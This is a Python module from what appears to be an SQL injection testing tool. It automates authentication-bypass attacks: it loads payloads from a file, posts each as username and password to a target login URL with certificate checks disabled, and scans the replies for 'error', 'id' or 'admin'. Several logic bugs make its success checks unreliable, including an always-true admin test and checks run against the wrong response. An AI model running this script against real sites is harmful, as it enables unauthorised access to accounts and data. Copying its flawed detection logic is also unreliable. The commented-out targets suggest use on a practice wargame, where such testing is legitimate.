import os
import asyncio
import re
import requests
from colorama import Fore,init
from datetime import datetime
import sqlite3
import logging
import json
import sys
import sys
import os
import logging

current_directory = os.getcwd()

sys.path.append(current_directory)


attack_type = "authentication bypass SQL injection"
from lib.scripts.headers import Prepare_the_headers
from lib.scripts.headers import headers
from lib.scripts.headers import header
from  lib.regelexpression.patterns import Detect
from lib.priority.Priority import PRIORITY
from lib.priority.Priority import HARMFULL
from logger.logs import logger
from lib.result.Results import safe_SQLJNG_result
from lib.result.Results import SQLJNG_result_report
from Exceptions.exceptions import SQLJNGStackRangeError
from lib.Stacks.stack import html_response

attack_type = "authentication bypass SQL injection"

""" 
              Reference : https://github.com/payloadbox/sql-injection-payload-list 
              for The payloads"""

__priority__ = PRIORITY.HIGH
__harmfull__ = HARMFULL.HIGH
__Category__ = AttackTypes.AUTH_BYPASS_SQL_INJECTION+"json"


pattern = r"\berror\b"
htmlpattern = r"\bid\b"
capturesAUTHBYPASS = []



async def auth_SQL_inj_json(urls):
    """This is the authentication bypass sql injection block. it occurs when the input datas are not validated and attacker can inject its own code to the database and bypass the authentication"""
    try:
        global pattern,htmlpattern 
        done = False 
        filename = "auth_bypass.txt" 
        current_directory = os.path.dirname(os.path.abspath(__file__)) 
        file_path = os.path.join(current_directory, filename) 

        with open(file_path, "r") as file: 
            payload = file.read() 
            rows = payload.split("\n") 
            sorted_rows = sorted(rows) 
            sorted_payload = "\n".join(sorted_rows)
            logger.info(f"The payload is:\n\n{sorted_payload}\n\n")
            requests.packages.urllib3.disable_warnings()  #! Disable SSL warnings for http requests and testing
            req = requests.get(url=urls,verify=False) 
            if req.status_code == 200: 
                ask = input(f"[{datetime.now()}]"+Fore.GREEN + f"Looks like the host is up with the url: {urls}\n Do you want to send the above payload to the website? ")
                logger.info(f"The website:{urls} is returning 200 status code.\n\n")

                if ask.lower() == "y": 
                    for line in sorted_payload.split("\n"):
                        #############################################################33
                        params = { 
                            "username": json.dumps(line),
                            "password": json.dumps(line)
                        }
                        
                        inp = input(Fore.RESET+Fore.LIGHTBLUE_EX+f"JSON payload:\nf{params['username']}\n{params['password']} \npress enter to send the json data to the server:\n press any key to send payloads auto.")
                        logger.info(f"Testing payload:{json.dumps(line)}")
                        if inp:
                            ack = requests.post(url=urls, data=params,verify=False)
                            logger.info(f"Testing payload:{json.dumps(line)}") 
                            await asyncio.sleep(5) 
                            if "error" in ack.text: 
                                logger.info(f"Could find parameter Error,keyword:{json.dumps(line)}")
                                Detect(ack.text)
                                html_response.push(ack.text)
                                
                            vuln = re.findall(pattern=pattern,string=ack.text,flags=re.IGNORECASE)
                            htmlVULN = re.findall(pattern=htmlpattern,string=ack.text,flags=re.IGNORECASE) 
                            if vuln: 
                                logging.info(f"Could find parameter id,keyword:{json.dumps(line)}")
                                Detect(ack.text)
                                await asyncio.sleep(3) 
                                html_response.push(ack.text)
                            
                            if htmlVULN:
                                logger.info(f"Could find error parameter, keyword:{json.dumps(line)}")
                                Detect(ack.text)
                                await asyncio.sleep(3)
                                html_response.push(ack.text)
                            
                            word = "id" in req.text 
                            errword = "error" in req.text
                            if word:
                                logger.info(f"Could find parameter id, keyword:{json.dumps(line)}")
                                Detect(ack.text)
                                await asyncio.sleep(3)
                                html_response.push(ack.text)
                            
                            if errword:
                                logger.info(f"Could find parameter error, keyword:{json.dumps(line)}")
                                Detect(ack.text)
                                await asyncio.sleep(3)
                                html_response.push(ack.text)
                        
                        elif inp == "esc":
                            raise SystemExit
                        
                        elif not inp:
                            pass
                        
                        
                        else:
                            pass
                        
                        
                                
                            
                                
                        if req.status_code == 302: 
                            logger.info(f"Could inject parameter,keyword:{json.dumps(line)},target:{urls}")
                            done = True
                        
                        if "Admin" or "admin" in vuln or "Admin" or "admin" in ack.text or "Admin" or "admin" in htmlVULN:
                            Detect(ack.text)
                            logger.info(f"Could find parameter admin,keyword:{json.dumps(line)},target:{urls}")
                            html_response.push(ack.text)
                            
                elif ask.lower() == "n":
                    sys.exit(0)
                    
                else:
                    pass
                
            else:
                logger.info(f"Host is down:{urls}")
                

        
                        
                    
    except Exception as e:
        logging.error(f"An error occurred:{e},Time: {datetime.now()}")
        
    except KeyboardInterrupt:
        pass
        
    except SystemExit:
        raise
        
    finally:
        logger.info(f"The attack is done")
        try:
            await SQLJNG_result_report(html_response)
        
        except SQLJNGStackRangeError:
            result = safe_SQLJNG_result(html_response)
            for res in result:
                logger.info(res)
        
        


async def auth_main(urL):
    await auth_SQL_inj_json(urL)

# asyncio.run(auth_main("https://redtiger.labs.overthewire.org/level1.php"))
# asyncio.run(auth_SQL_inj_json("https://redtiger.labs.overthewire.org/"))
